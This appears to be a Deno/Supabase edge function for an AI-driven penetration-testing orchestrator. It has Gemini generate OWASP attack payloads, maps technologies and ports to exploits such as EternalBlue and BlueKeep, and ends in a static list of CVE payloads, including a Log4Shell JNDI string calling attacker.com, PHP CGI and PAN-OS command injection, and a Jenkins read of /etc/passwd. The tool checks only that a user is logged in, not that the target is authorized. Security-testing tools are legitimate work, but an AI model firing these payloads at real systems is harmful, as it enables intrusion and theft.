import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version',
};

const LOVABLE_API_KEY = Deno.env.get('LOVABLE_API_KEY');
const AI_GATEWAY_URL = 'https://ai.gateway.lovable.dev/v1/chat/completions';
const SUPABASE_URL = Deno.env.get('SUPABASE_URL') ?? '';
const SUPABASE_ANON_KEY = Deno.env.get('SUPABASE_ANON_KEY') ?? '';

// ====== OWASP Top 10 (2021) Full Coverage ======
const OWASP_TOP_10 = {
  'A01:2021': {
    name: 'Broken Access Control',
    scans: ['idor', 'auth-bypass', 'cors-advanced', 'directory', 'csrf'],
    aiPayloadPrompt: 'Generate 5 advanced IDOR and access control bypass payloads for a web app. Include horizontal/vertical privilege escalation, forced browsing, API endpoint manipulation, and JWT claim tampering. Return JSON array of {payload, technique, target_param}.'
  },
  'A02:2021': {
    name: 'Cryptographic Failures',
    scans: ['ssl', 'headers', 'cookies'],
    aiPayloadPrompt: 'Generate 5 payloads to test for cryptographic failures: weak TLS, missing HSTS, cleartext credentials in URLs/headers, weak hashing exposure, padding oracle. Return JSON array of {payload, technique, target_param}.'
  },
  'A03:2021': {
    name: 'Injection',
    scans: ['sqli', 'sqli-blind', 'xss', 'nosql-inject', 'lfi', 'rce-test'],
    aiPayloadPrompt: 'Generate 10 advanced injection payloads covering: error-based SQLi with WAF bypass, blind SQLi with time-based detection, DOM XSS, stored XSS via SVG, NoSQL operator injection, OS command injection via parameter pollution, LDAP injection, template injection (SSTI). Include encoding variations. Return JSON array of {payload, technique, target_param, encoding}.'
  },
  'A04:2021': {
    name: 'Insecure Design',
    scans: ['forms', 'crawl', 'rate-limit'],
    aiPayloadPrompt: 'Generate 5 test cases for insecure design: business logic bypass, race conditions, missing rate limits on sensitive endpoints, predictable resource IDs, unlimited file upload. Return JSON array of {payload, technique, target_param}.'
  },
  'A05:2021': {
    name: 'Security Misconfiguration',
    scans: ['headers', 'directory', 'tech', 'cors-advanced', 'metadata'],
    aiPayloadPrompt: 'Generate 5 payloads for security misconfig: verbose error messages, default credentials, exposed admin panels, unnecessary HTTP methods enabled, missing security headers. Return JSON array of {payload, technique, target_param}.'
  },
  'A06:2021': {
    name: 'Vulnerable & Outdated Components',
    scans: ['tech', 'cve-scan', 'banner'],
    aiPayloadPrompt: 'Generate 5 test vectors for outdated components: known CVE exploit paths for common CMS (WordPress, Drupal), outdated JS libraries (jQuery <3.5), Apache Struts RCE, Log4Shell, Spring4Shell. Return JSON array of {payload, technique, cve_id}.'
  },
  'A07:2021': {
    name: 'Identification & Authentication Failures',
    scans: ['auth-bypass', 'jwt-test', 'cookies', 'cookie-hijack'],
    aiPayloadPrompt: 'Generate 5 auth failure test payloads: credential stuffing patterns, session fixation, JWT none algorithm, password reset token prediction, brute force with common creds. Return JSON array of {payload, technique, target_param}.'
  },
  'A08:2021': {
    name: 'Software & Data Integrity Failures',
    scans: ['headers', 'links', 'ssl'],
    aiPayloadPrompt: 'Generate 3 test vectors for integrity failures: missing SRI on CDN scripts, insecure deserialization (Java/PHP/Python), CI/CD pipeline poisoning indicators. Return JSON array of {payload, technique, target_param}.'
  },
  'A09:2021': {
    name: 'Security Logging & Monitoring Failures',
    scans: ['headers', 'directory'],
    aiPayloadPrompt: 'Generate 3 test vectors for logging failures: exposed log files, missing audit trails for auth events, error messages leaking stack traces. Return JSON array of {payload, technique, target_param}.'
  },
  'A10:2021': {
    name: 'Server-Side Request Forgery',
    scans: ['ssrf', 'metadata'],
    aiPayloadPrompt: 'Generate 5 advanced SSRF payloads: cloud metadata (AWS/GCP/Azure), internal service discovery, DNS rebinding, protocol smuggling (gopher://), URL parser differentials. Return JSON array of {payload, technique, target_param}.'
  },
};

// ====== Tech-Aware Payload Mapping ======
const TECH_PAYLOAD_MAP: Record<string, { scans: string[]; exploitHint: string }> = {
  'wordpress': { scans: ['sqli', 'xss', 'directory', 'auth-bypass'], exploitHint: 'Focus on wp-admin, xmlrpc.php, REST API /wp-json/, plugin vulns' },
  'apache': { scans: ['directory', 'headers', 'lfi', 'cve-scan'], exploitHint: 'Check mod_status, mod_info, .htaccess bypass, Struts if detected' },
  'nginx': { scans: ['headers', 'directory', 'ssrf'], exploitHint: 'Check alias traversal, off-by-slash, proxy_pass misconfig' },
  'php': { scans: ['sqli', 'lfi', 'xss', 'rce-test'], exploitHint: 'Test type juggling, deserialization, include path injection' },
  'node': { scans: ['nosql-inject', 'ssrf', 'xss'], exploitHint: 'Test prototype pollution, SSRF via axios, template injection' },
  'react': { scans: ['xss', 'headers', 'cors-advanced'], exploitHint: 'Test dangerouslySetInnerHTML, API endpoint exposure' },
  'java': { scans: ['sqli', 'rce-test', 'cve-scan'], exploitHint: 'Test Log4Shell, Spring4Shell, deserialization gadgets' },
  'python': { scans: ['sqli', 'rce-test', 'ssrf'], exploitHint: 'Test Jinja2 SSTI, pickle deserialization, SSRF in requests' },
  'mysql': { scans: ['sqli', 'sqli-blind', 'db-enum'], exploitHint: 'UNION-based, stacked queries, INTO OUTFILE' },
  'postgresql': { scans: ['sqli', 'sqli-blind'], exploitHint: 'Dollar-quoting, COPY TO, large objects' },
  'iis': { scans: ['directory', 'headers', 'auth-bypass'], exploitHint: 'Short filename disclosure, web.config exposure' },
};

const PORT_EXPLOIT_MAP: Record<number, { service: string; exploits: string[] }> = {
  21: { service: 'FTP', exploits: ['anonymous-login', 'ftp-bounce', 'vsftpd-backdoor'] },
  22: { service: 'SSH', exploits: ['weak-creds', 'key-enum', 'version-vuln'] },
  23: { service: 'Telnet', exploits: ['cleartext-creds', 'brute-force'] },
  25: { service: 'SMTP', exploits: ['open-relay', 'user-enum', 'vrfy'] },
  80: { service: 'HTTP', exploits: ['full-owasp-top10'] },
  443: { service: 'HTTPS', exploits: ['full-owasp-top10', 'ssl-vulns'] },
  445: { service: 'SMB', exploits: ['eternal-blue', 'null-session', 'smb-signing'] },
  3306: { service: 'MySQL', exploits: ['auth-bypass', 'sqli-direct'] },
  3389: { service: 'RDP', exploits: ['bluekeep', 'brute-force'] },
  5432: { service: 'PostgreSQL', exploits: ['auth-bypass', 'sqli-direct'] },
  8080: { service: 'HTTP-Alt', exploits: ['full-owasp-top10', 'admin-panels'] },
  8443: { service: 'HTTPS-Alt', exploits: ['full-owasp-top10'] },
  27017: { service: 'MongoDB', exploits: ['nosql-inject', 'no-auth'] },
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { action, data } = await req.json();

    const authHeader = req.headers.get('Authorization');
    if (!authHeader?.startsWith('Bearer ')) {
      return new Response(JSON.stringify({ error: 'Authentication required' }), {
        status: 401, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } }
    });
    const { data: userData, error: userError } = await supabase.auth.getUser();
    if (userError || !userData?.user) {
      return new Response(JSON.stringify({ error: 'Invalid token' }), {
        status: 401, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }
    const userId = userData.user.id;

    switch (action) {
      // ===== CONNECTION CHECK =====
      case 'check-connection': {
        const { target } = data;
        const result = await checkTargetConnection(target);
        return jsonResponse(result);
      }

      // ===== AI THINKING / REASONING =====
      case 'ai-reasoning': {
        const { target, phase, context, humanCorrection } = data;
        const thought = await generateAIThought(target, phase, context, humanCorrection);
        return jsonResponse(thought);
      }

      // ===== GENERATE AI PAYLOADS =====
      case 'generate-ai-payloads': {
        const { target, owaspCategory, techStack, ports } = data;
        const payloads = await generateAIPayloads(target, owaspCategory, techStack, ports);
        return jsonResponse(payloads);
      }

      // ===== BUILD TARGET TREE =====
      case 'build-target-tree': {
        const { target, findings, subdomains, techStack, ports } = data;
        const tree = buildTargetTree(target, findings, subdomains, techStack, ports);
        return jsonResponse(tree);
      }

      // ===== UPDATE VULNERABILITY KNOWLEDGE BASE =====
      case 'update-vuln-kb': {
        const kb = await updateVulnerabilityKnowledgeBase();
        // Save to DB for persistence
        await supabase.from('ai_learnings').insert({
          user_id: userId,
          tool_used: 'vuln-kb-update',
          target: 'global',
          findings: kb as any,
          success: true,
          ai_analysis: `Updated vulnerability knowledge base with ${kb.entries?.length || 0} entries`,
          improvement_strategy: 'Daily auto-update of latest CVEs, techniques, and attack vectors',
        });
        return jsonResponse(kb);
      }

      // ===== TECH-AWARE EXPLOIT SELECTION =====
      case 'select-exploits': {
        const { techStack: ts, ports: p, target: t } = data;
        const exploits = selectTechAwareExploits(ts, p, t);
        return jsonResponse(exploits);
      }

      // ===== GET OWASP COVERAGE =====
      case 'get-owasp-coverage': {
        return jsonResponse({ categories: OWASP_TOP_10 });
      }

      default:
        return new Response(JSON.stringify({ error: 'Unknown action' }), {
          status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
    }
  } catch (error) {
    console.error('[AI Scan Orchestrator Error]', error);
    return new Response(JSON.stringify({ error: error.message }), {
      status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});

function jsonResponse(data: any) {
  return new Response(JSON.stringify({ success: true, ...data }), {
    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
  });
}

// ===== CONNECTION CHECK =====
async function checkTargetConnection(target: string): Promise<any> {
  const cleanTarget = target.replace(/^https?:\/\//, '').split('/')[0];
  const protocols = ['https', 'http'];
  const results: any[] = [];

  for (const proto of protocols) {
    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 8000);
      const start = Date.now();
      const resp = await fetch(`${proto}://${cleanTarget}`, {
        method: 'HEAD',
        signal: controller.signal,
        redirect: 'follow',
      });
      clearTimeout(timeout);
      const latency = Date.now() - start;
      results.push({
        protocol: proto,
        status: resp.status,
        latency,
        reachable: true,
        server: resp.headers.get('server') || 'unknown',
      });
    } catch (e) {
      results.push({ protocol: proto, reachable: false, error: e.message });
    }
  }

  const reachable = results.some(r => r.reachable);
  return {
    target: cleanTarget,
    reachable,
    results,
    recommendation: reachable
      ? `Target is reachable (${results.find(r => r.reachable)?.latency}ms). Proceeding with scan.`
      : `Target ${cleanTarget} is unreachable on both HTTP and HTTPS. Scan aborted.`,
  };
}

// ===== AI REASONING / THINKING =====
async function generateAIThought(target: string, phase: string, context: any, humanCorrection?: string): Promise<any> {
  if (!LOVABLE_API_KEY) {
    return { thought: `[${phase}] Analyzing ${target} — proceeding with standard methodology.`, actions: [] };
  }

  const correctionContext = humanCorrection
    ? `\n\nIMPORTANT: The human operator has provided this correction/guidance: "${humanCorrection}". Adjust your reasoning accordingly.`
    : '';

  try {
    const resp = await fetch(AI_GATEWAY_URL, {
      method: 'POST',
      headers: { 'Authorization': `Bearer ${LOVABLE_API_KEY}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({
        model: 'google/gemini-2.5-flash',
        messages: [
          {
            role: 'system',
            content: `You are an expert red team AI assistant performing a security assessment. Think aloud about your next steps, reasoning about the target, technology, and attack surface. Be specific about what you're checking and why. Format your response as JSON: {"thought":"your detailed reasoning (2-3 sentences)", "actions":["action1","action2"], "risk_assessment":"brief risk note", "owasp_coverage":["A01","A03"]}`
          },
          {
            role: 'user',
            content: `Target: ${target}\nPhase: ${phase}\nContext: ${JSON.stringify(context || {})}\nFindings so far: ${context?.findings_count || 0}${correctionContext}\n\nThink aloud about what you're doing and why.`
          }
        ],
        max_tokens: 400,
      })
    });

    if (!resp.ok) { await resp.text(); throw new Error('AI API error'); }
    const result = await resp.json();
    const content = result.choices?.[0]?.message?.content || '';
    const jsonMatch = content.match(/\{[\s\S]*\}/);
    if (jsonMatch) return JSON.parse(jsonMatch[0]);
    return { thought: content.slice(0, 300), actions: [] };
  } catch (e) {
    return { thought: `[${phase}] Proceeding with standard ${phase} methodology against ${target}.`, actions: [] };
  }
}

// ===== AI PAYLOAD GENERATION =====
async function generateAIPayloads(target: string, owaspCategory: string, techStack: string[], ports: number[]): Promise<any> {
  const owaspEntry = OWASP_TOP_10[owaspCategory as keyof typeof OWASP_TOP_10];
  if (!owaspEntry || !LOVABLE_API_KEY) {
    return { payloads: [], category: owaspCategory };
  }

  const techContext = techStack.length > 0
    ? `Target uses: ${techStack.join(', ')}. Tailor payloads to these technologies.`
    : '';
  const portContext = ports.length > 0
    ? `Open ports: ${ports.join(', ')}. Consider service-specific attacks.`
    : '';

  try {
    const resp = await fetch(AI_GATEWAY_URL, {
      method: 'POST',
      headers: { 'Authorization': `Bearer ${LOVABLE_API_KEY}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({
        model: 'google/gemini-2.5-flash',
        messages: [
          {
            role: 'system',
            content: 'You are a professional penetration tester generating test payloads for authorized security assessments. Generate practical, real-world payloads. Return ONLY valid JSON array.'
          },
          {
            role: 'user',
            content: `${owaspEntry.aiPayloadPrompt}\n\nTarget: ${target}\n${techContext}\n${portContext}\n\nReturn only a JSON array.`
          }
        ],
        max_tokens: 800,
      })
    });

    if (!resp.ok) { await resp.text(); return { payloads: [], error: 'AI generation failed' }; }
    const result = await resp.json();
    const content = result.choices?.[0]?.message?.content || '';
    const jsonMatch = content.match(/\[[\s\S]*\]/);
    if (jsonMatch) {
      return { payloads: JSON.parse(jsonMatch[0]), category: owaspCategory, name: owaspEntry.name };
    }
    return { payloads: [], category: owaspCategory };
  } catch (e) {
    return { payloads: [], error: e.message };
  }
}

// ===== TARGET TREE BUILDER =====
function buildTargetTree(target: string, findings: any[], subdomains: string[], techStack: string[], ports: number[]): any {
  const cleanTarget = target.replace(/^https?:\/\//, '').split('/')[0];

  // Group findings by subdomain
  const subdomainNodes = subdomains.map(sub => {
    const subFindings = findings.filter((f: any) => f.subdomain === sub || f.evidence?.target === sub);
    const subEndpoints = [...new Set(subFindings.map((f: any) => f.evidence?.raw?.poc?.match(/(?:GET|POST)\s+([^\s]+)/)?.[1]).filter(Boolean))];
    return {
      name: sub,
      type: 'subdomain',
      live: true,
      endpoints: subEndpoints.slice(0, 10),
      vulnerabilities: subFindings.map((f: any) => ({
        name: f.title || f.name,
        severity: f.severity,
        verified: f.verified || false,
      })),
      findingsCount: subFindings.length,
    };
  });

  // Endpoints from primary target
  const primaryFindings = findings.filter((f: any) => !f.subdomain);
  const primaryEndpoints = [...new Set(primaryFindings.flatMap((f: any) => {
    const pocMatch = f.evidence?.raw?.poc?.match(/(?:GET|POST|PUT)\s+([^\s]+)/g) || [];
    return pocMatch.map((m: string) => m.replace(/^(GET|POST|PUT)\s+/, ''));
  }).filter(Boolean))];

  // Open ports with services
  const portNodes = ports.map(p => ({
    port: p,
    service: PORT_EXPLOIT_MAP[p]?.service || 'unknown',
    exploits: PORT_EXPLOIT_MAP[p]?.exploits || [],
  }));

  // Vulnerability summary
  const vulnSummary = {
    critical: findings.filter((f: any) => f.severity === 'critical').length,
    high: findings.filter((f: any) => f.severity === 'high').length,
    medium: findings.filter((f: any) => f.severity === 'medium').length,
    low: findings.filter((f: any) => f.severity === 'low').length,
    info: findings.filter((f: any) => f.severity === 'info').length,
    verified: findings.filter((f: any) => f.verified).length,
    total: findings.length,
  };

  return {
    tree: {
      name: cleanTarget,
      type: 'domain',
      children: [
        {
          name: 'Subdomains',
          type: 'group',
          count: subdomainNodes.length,
          children: subdomainNodes,
        },
        {
          name: 'Endpoints',
          type: 'group',
          count: primaryEndpoints.length,
          children: primaryEndpoints.slice(0, 20).map(ep => ({ name: ep, type: 'endpoint' })),
        },
        {
          name: 'Technology Stack',
          type: 'group',
          count: techStack.length,
          children: techStack.map(t => ({ name: t, type: 'technology' })),
        },
        {
          name: 'Open Ports',
          type: 'group',
          count: portNodes.length,
          children: portNodes.map(p => ({ name: `${p.port} (${p.service})`, type: 'port', ...p })),
        },
        {
          name: 'Vulnerabilities',
          type: 'group',
          count: vulnSummary.total,
          summary: vulnSummary,
          children: findings
            .filter((f: any) => f.severity === 'critical' || f.severity === 'high')
            .slice(0, 15)
            .map((f: any) => ({
              name: f.title || f.name,
              type: 'vulnerability',
              severity: f.severity,
              verified: f.verified || false,
            })),
        },
      ],
    },
    summary: vulnSummary,
  };
}

// ===== TECH-AWARE EXPLOIT SELECTION =====
function selectTechAwareExploits(techStack: string[], ports: number[], target: string): any {
  const selectedScans: string[] = [];
  const exploitNotes: string[] = [];

  // Match detected tech to scan types
  for (const tech of techStack) {
    const techLower = tech.toLowerCase();
    for (const [key, config] of Object.entries(TECH_PAYLOAD_MAP)) {
      if (techLower.includes(key)) {
        selectedScans.push(...config.scans);
        exploitNotes.push(`${key}: ${config.exploitHint}`);
      }
    }
  }

  // Match open ports to exploits
  for (const port of ports) {
    const portConfig = PORT_EXPLOIT_MAP[port];
    if (portConfig) {
      exploitNotes.push(`Port ${port} (${portConfig.service}): ${portConfig.exploits.join(', ')}`);
      if (portConfig.exploits.includes('full-owasp-top10')) {
        selectedScans.push('sqli', 'xss', 'lfi', 'ssrf', 'cors-advanced', 'directory');
      }
    }
  }

  return {
    recommended_scans: [...new Set(selectedScans)],
    exploit_notes: exploitNotes,
    auto_selected: true,
  };
}

// ===== VULNERABILITY KNOWLEDGE BASE UPDATE =====
async function updateVulnerabilityKnowledgeBase(): Promise<any> {
  if (!LOVABLE_API_KEY) {
    return { entries: getStaticVulnKB(), source: 'static', updated_at: new Date().toISOString() };
  }

  try {
    const resp = await fetch(AI_GATEWAY_URL, {
      method: 'POST',
      headers: { 'Authorization': `Bearer ${LOVABLE_API_KEY}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({
        model: 'google/gemini-2.5-flash',
        messages: [
          {
            role: 'system',
            content: 'You are a vulnerability intelligence analyst. Provide the latest critical CVEs and attack techniques that penetration testers should test for. Focus on actively exploited vulnerabilities and new attack techniques from the past 90 days.'
          },
          {
            role: 'user',
            content: `Generate a vulnerability knowledge base update with the latest 15 critical/high-severity vulnerabilities and attack techniques. For each, include: CVE ID (if applicable), name, affected software, severity, test methodology, and detection payload. Return as JSON array: [{"cve":"CVE-XXXX-XXXXX","name":"...","affected":"...","severity":"critical|high","test_method":"...","payload":"...","date":"YYYY-MM-DD"}]`
          }
        ],
        max_tokens: 1500,
      })
    });

    if (!resp.ok) { await resp.text(); throw new Error('AI KB update failed'); }
    const result = await resp.json();
    const content = result.choices?.[0]?.message?.content || '';
    const jsonMatch = content.match(/\[[\s\S]*\]/);
    if (jsonMatch) {
      return {
        entries: JSON.parse(jsonMatch[0]),
        source: 'ai-generated',
        updated_at: new Date().toISOString(),
        next_update: new Date(Date.now() + 86400000).toISOString(),
      };
    }
  } catch (e) {
    console.warn('[Vuln KB] AI update failed, using static:', e);
  }

  return { entries: getStaticVulnKB(), source: 'static-fallback', updated_at: new Date().toISOString() };
}

function getStaticVulnKB(): any[] {
  return [
    { cve: 'CVE-2024-4577', name: 'PHP CGI Argument Injection', affected: 'PHP 8.1/8.2/8.3 on Windows', severity: 'critical', test_method: 'Send crafted request with soft hyphens', payload: 'GET /test.php?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input', date: '2024-06-09' },
    { cve: 'CVE-2024-3400', name: 'PAN-OS Command Injection', affected: 'Palo Alto PAN-OS GlobalProtect', severity: 'critical', test_method: 'Cookie-based command injection', payload: 'Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/hour/aaa`id`', date: '2024-04-12' },
    { cve: 'CVE-2024-21762', name: 'Fortinet FortiOS Out-of-Bound Write', affected: 'FortiOS SSL VPN', severity: 'critical', test_method: 'Crafted HTTP request to SSL VPN', payload: 'POST /remote/hostcheck_validate HTTP/1.1', date: '2024-02-08' },
    { cve: 'CVE-2024-27198', name: 'JetBrains TeamCity Auth Bypass', affected: 'TeamCity < 2023.11.4', severity: 'critical', test_method: 'Path traversal in auth endpoint', payload: 'GET /app/rest/users;.jsp HTTP/1.1', date: '2024-03-04' },
    { cve: 'CVE-2024-1709', name: 'ConnectWise ScreenConnect Auth Bypass', affected: 'ScreenConnect < 23.9.8', severity: 'critical', test_method: 'Setup wizard access', payload: 'GET /SetupWizard.aspx HTTP/1.1', date: '2024-02-19' },
    { cve: 'CVE-2023-44228', name: 'Log4Shell (Persistent)', affected: 'Apache Log4j2 < 2.17.1', severity: 'critical', test_method: 'JNDI lookup injection', payload: '${jndi:ldap://attacker.com/a}', date: '2021-12-10' },
    { cve: 'CVE-2024-23897', name: 'Jenkins CLI Arbitrary File Read', affected: 'Jenkins < 2.442', severity: 'critical', test_method: 'CLI argument parser exploitation', payload: 'java -jar jenkins-cli.jar -s http://target/ who-am-i @/etc/passwd', date: '2024-01-24' },
    { cve: 'N/A', name: 'Prototype Pollution', affected: 'Node.js apps with lodash/jQuery', severity: 'high', test_method: 'Inject __proto__ in JSON body', payload: '{"__proto__":{"admin":true}}', date: '2024-01-01' },
    { cve: 'N/A', name: 'JWT None Algorithm Attack', affected: 'Apps with weak JWT validation', severity: 'high', test_method: 'Change alg to none', payload: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwiYWRtaW4iOnRydWV9.', date: '2024-01-01' },
    { cve: 'N/A', name: 'GraphQL Batching Attack', affected: 'GraphQL APIs without rate limiting', severity: 'high', test_method: 'Send batched queries', payload: '[{"query":"{ user(id:1) { email } }"},{"query":"{ user(id:2) { email } }"}]', date: '2024-01-01' },
  ];
}
